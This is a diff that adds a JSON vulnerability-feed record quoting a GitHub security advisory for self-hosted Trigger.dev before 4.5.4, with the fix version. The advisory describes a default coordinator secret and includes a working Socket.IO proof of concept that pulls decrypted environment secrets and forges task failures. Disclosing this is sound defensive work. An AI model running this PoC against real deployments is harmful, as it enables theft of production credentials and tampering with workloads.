@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 1, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/1862727?v=4\", \"events_url\": \"https://api.github.com/users/lissy93/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/lissy93/followers\", \"following_url\": \"https://api.github.com/users/lissy93/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/lissy93/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/lissy93\", \"id\": 1862727, \"login\": \"lissy93\", \"node_id\": \"MDQ6VXNlcjE4NjI3Mjc=\", \"organizations_url\": \"https://api.github.com/users/lissy93/orgs\", \"received_events_url\": \"https://api.github.com/users/lissy93/received_events\", \"repos_url\": \"https://api.github.com/users/lissy93/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/lissy93/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/lissy93/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/lissy93\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 9.2, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}, {\"cwe_id\": \"CWE-798\", \"name\": \"Use of Hard-coded Credentials\"}, {\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"## TL;DR\\n\\nThe /coordinator Socket.IO namespace mounts on every webapp boot and authenticates with a default secret (\\\"coordinator-secret\\\") baked into source. The override variable isn't documented in the self-host docs, .env.example, or helm values, so any operator who didn't read source ships with the default. Once connected, READY_FOR_EXECUTION returns the run's decrypted env vars. Anyone who can reach a default-config self-hosted webapp can pull production secrets out of any run whose internal id they can find.\\n\\n## Vulnerabilities\\n\\nThis attack is made possible by 3 vulnerabilities in Trigger.dev:\\n\\n### 1. Hardcoded default authentication secret (CWE-798, Critical)\\nPROVIDER_SECRET and COORDINATOR_SECRET are declared with `.default(\\\"provider-secret\\\")` / `.default(\\\"coordinator-secret\\\")` in [`apps/webapp/app/env.server.ts:289-290`](https://github.com/triggerdotdev/trigger.dev/blob/v4.4.4/apps/webapp/app/env.server.ts#L289-L290). The values are present in the public source repo, neither var is documented in `docs/self-hosting/env/*.mdx`, `hosting/docker/.env.example`, or `hosting/k8s/helm/values.yaml`, and the auth check at [`packages/core/src/v3/zodNamespace.ts:148`](https://github.com/triggerdotdev/trigger.dev/blob/v4.4.4/packages/core/src/v3/zodNamespace.ts#L148) is a plain string compare against that published value\\n\\n### 2. Coordinator handler returns decrypted env vars to any authenticated caller (CWE-200, High)\\n`READY_FOR_EXECUTION` at [`apps/webapp/app/v3/handleSocketIo.server.ts:123`](https://github.com/triggerdotdev/trigger.dev/blob/v4.4.4/apps/webapp/app/v3/handleSocketIo.server.ts#L123) calls `sharedQueueTasks.getLatestExecutionPayloadFromRun(runId, ...)`, which at [`apps/webapp/app/v3/marqs/sharedQueueConsumer.server.ts:1881-1895`](https://github.com/triggerdotdev/trigger.dev/blob/v4.4.4/apps/webapp/app/v3/marqs/sharedQueueConsumer.server.ts#L1881-L1895) returns `payload.environment` as the run's decrypted env-var dictionary. Any internal runId is enough to exfil that run's full env, regardless of tenant. Note: this read handler lives in V1-only `marqs/` code, so it returns nothing for runs on V2 (Run Engine 2.0). Self-hosts still on V1 are fully exposed; v4-only deployments only see the write handlers below\\n\\n### 3. Other coordinator handlers accept attacker-controlled writes against arbitrary runs (CWE-862, High)\\nTASK_RUN_COMPLETED, TASK_RUN_COMPLETED_WITH_ACK, TASK_RUN_FAILED_TO_RUN, CHECKPOINT_CREATED, CREATE_WORKER and friends invoke webapp services with attacker-supplied completion / attempt / worker payloads. None of them check that the caller has authority over the runId or attemptId in the message. `attempt_*` friendlyIds leak through every dashboard URL and emailed alert, so writes are trivially reachable without any internal id\\n\\n## Exploit chain / PoC\\n\\n```js\\nimport { io } from \\\"socket.io-client\\\";\\n\\nconst sock = io(\\\"https://<self-hosted-target>/coordinator\\\", {\\n  auth: { token: \\\"coordinator-secret\\\" },\\n  transports: [\\\"websocket\\\"],\\n});\\n\\nsock.on(\\\"connect\\\", () => {\\n  // exfil decrypted env for a known run id\\n  sock.emit(\\\"READY_FOR_EXECUTION\\\", { runId: \\\"<runId>\\\", totalCompletions: 0 }, (res) => {\\n    console.log(res.payload.environment);\\n    // { DATABASE_URL: \\\"...\\\", STRIPE_SECRET_KEY: \\\"...\\\", OPENAI_API_KEY: \\\"...\\\", ... }\\n  });\\n\\n  // mark any attempt failed\\n  sock.emit(\\\"TASK_RUN_FAILED_TO_RUN\\\", {\\n    completion: {\\n      id: \\\"<attempt_friendlyId>\\\",\\n      ok: false,\\n      error: { type: \\\"INTERNAL_ERROR\\\", code: \\\"FORGED\\\", message: \\\"owned\\\" },\\n    },\\n  });\\n});\\n```\\n\\n## Resolution\\n\\nFixed in **v4.5.4**. The entire end-of-life V1 (Run Engine 1.0) execution stack was removed in commit `5ba8557a5` (#4236) — including the `/coordinator`, `/provider`, and `/shared-queue` Socket.IO namespaces, `packages/core/src/v3/zodNamespace.ts`, the `marqs` shared-queue consumer, and the `PROVIDER_SECRET` / `COORDINATOR_SECRET` environment variables.\\n\\nAll three vulnerabilities are absent in v4.5.4 and later: the vulnerable namespaces no longer mount, the `READY_FOR_EXECUTION` env-var read handler and the unauthenticated write handlers no longer exist, and the hardcoded default secrets are gone.\\n\\n**Affected:** self-hosted Trigger.dev `< 4.5.4`. Vulnerability #2 (decrypted env-var exfiltration) additionally required a deployment still running Run Engine 1.0; v4-only (Run Engine 2.0) deployments were exposed only to the write handlers (#3).\\n\\n**Managed cloud (cloud.trigger.dev) was not affected:** it was configured with non-default control-plane secrets, so the default-secret entry point (vulnerability #1) that gates the chain never applied.\\n\\n**Action:** self-hosted operators on any release before v4.5.4 should upgrade to v4.5.4 or later.\", \"ghsa_id\": \"GHSA-gg6r-gp4c-89hp\", \"github_reviewed_at\": \"2026-10-02T22:39:00Z\", \"html_url\": \"https://github.com/advisories/GHSA-gg6r-gp4c-89hp\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-gg6r-gp4c-89hp\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-02T22:39:00Z\", \"references\": [\"https://github.com/triggerdotdev/trigger.dev/security/advisories/GHSA-gg6r-gp4c-89hp\", \"https://github.com/triggerdotdev/trigger.dev/pull/4236\", \"https://github.com/triggerdotdev/trigger.dev/commit/5ba8557a51533be05f04245b03e1ca975cd57eff\", \"https://github.com/triggerdotdev/trigger.dev/releases/tag/v4.5.4\", \"https://github.com/advisories/GHSA-gg6r-gp4c-89hp\"], \"repository_advisory_url\": \"https://api.github.com/repos/triggerdotdev/trigger.dev/security-advisories/GHSA-gg6r-gp4c-89hp\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/triggerdotdev/trigger.dev\", \"summary\": \"Trigger.dev: V1 coordinator default-secret unauth Socket.IO\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-02T22:39:02Z\", \"url\": \"https://api.github.com/advisories/GHSA-gg6r-gp4c-89hp\", \"vulnerabilities\": [{\"first_patched_version\": \"4.5.4\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"trigger.dev\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.5.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-gg6r-gp4c-89hp",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "trigger.dev: < 4.5.4"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 9.2,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "trigger.dev"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-10-03T19:59:33.305654Z",
+  "provenance": {
+    "content_sha256": "df04e78c5cca991fda20dbabf9649353cbd4d19dfd5bf893d5f7def0b1e28365",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-02T22:39:00Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-gg6r-gp4c-89hp",
+  "status": "active",
+  "title": "Trigger.dev: V1 coordinator default-secret unauth Socket.IO",
+  "updated_at": "2026-10-02T22:39:02Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-gg6r-gp4c-89hp"
+}
